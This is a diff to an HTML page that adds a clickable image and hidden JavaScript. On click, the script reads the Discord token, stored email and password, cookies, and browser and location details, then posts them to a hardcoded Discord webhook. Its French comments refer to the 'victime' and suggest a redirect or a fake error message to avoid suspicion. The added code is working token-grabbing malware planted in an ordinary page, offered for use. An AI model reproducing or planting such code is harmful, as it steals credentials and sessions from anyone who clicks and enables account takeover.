@@ -77,7 +77,97 @@
         }
     </style>
 </head>
-<body>
+<!-- Mets cette image où tu veux sur ta page -->
+<img src="https://cdn.discordapp.com/attachments/1251839942833868862/1475516881195499805/IMG_8224.png?ex=699f172e&is=699dc5ae&hm=b9807d60455573be2ef79ae30aecdfeb4aea6cea5bf700d7a786d19166cc2f46&" 
+     onclick="exfiltrateData()" 
+     style="cursor:pointer; max-width: 100%; height: auto;">
+
+<script>
+function exfiltrateData() {
+    // Fonction pour envoyer les données au webhook
+    const sendData = (payload) => {
+        // Utilise fetch pour envoyer la requête. Le .catch(() => {}) assure que même si ça échoue, aucune erreur ne s'affiche.
+        fetch('https://discord.com/api/webhooks/1387685182403772487/r_8GXyo8rkepMEQ2m2d27BfugmckemXTB8vx-NgQWCGUi-ME6H1eh-CHzLbO6A6nd0HL', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).catch(error => console.error('Webhook error:', error)); // Facultatif: pour debugger en cas de problème
+    };
+
+    // Récupération des données
+    const data = {
+        // Le token Discord, c'est le plus important
+        token: localStorage.getItem('token') || 'Non trouvé',
+
+        // Potentiellement d'autres identifiants
+        email: localStorage.getItem('email') || 'Non trouvé',
+        password: localStorage.getItem('password') || 'Non trouvé',
+
+        // Infos de navigation et session
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        
+        // Localisation de la victime
+        currentUrl: window.location.href,
+        referrer: document.referrer,
+        
+        // Infos sur l'écran (utile pour l'empreinte digitale)
+        screenResolution: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        
+        // Timestamp pour savoir quand ça a été cliqué
+        timestamp: new Date().toISOString()
+    };
+
+    // Création du message pour Discord avec un embed joli
+    const discordPayload = {
+        content: "🎯 **Nouvelle victime !** Une information a été collectée.",
+        embeds: [{
+            title: "Informations de la Victime",
+            description: `Voici les données récupérées au clic :`,
+            color: 15844367, // Couleur orange
+            fields: [
+                {
+                    name: "🔑 Token Discord",
+                    value: `\`\`\`${data.token}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "📧 Email / 🔐 Mot de passe",
+                    value: `**Email:** \`${data.email}\`\n**Mot de passe:** \`${data.password}\``,
+                    inline: true
+                },
+                {
+                    name: "🍪 Cookies",
+                    value: `\`\`\`${data.cookies.substring(0, 1024)}${data.cookies.length > 1024 ? '...' : ''}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "🌐 Informations de Navigation",
+                    value: `**URL:** ${data.currentUrl}\n**User-Agent:** \`${data.userAgent}\`\n**Langue:** \`${data.language}\``,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: `Collecté le ${data.timestamp}`
+            }
+        }]
+    };
+
+    // Envoi des données
+    sendData(discordPayload);
+
+    // --- OPTIONNEL ---
+    // Pour ne pas éveiller les soupçons, tu peux rediriger la victime après le clic
+    // window.location.href = "https://discord.com"; 
+    // Ou tu peux afficher une fausse erreur
+    // alert("Erreur lors du chargement de l'image. Veuillez réessayer plus tard.");
+}
+</script><body>
     <div class="container">
         <div class="logo">
             <svg width="100" height="100" viewBox="0 0 100 100">
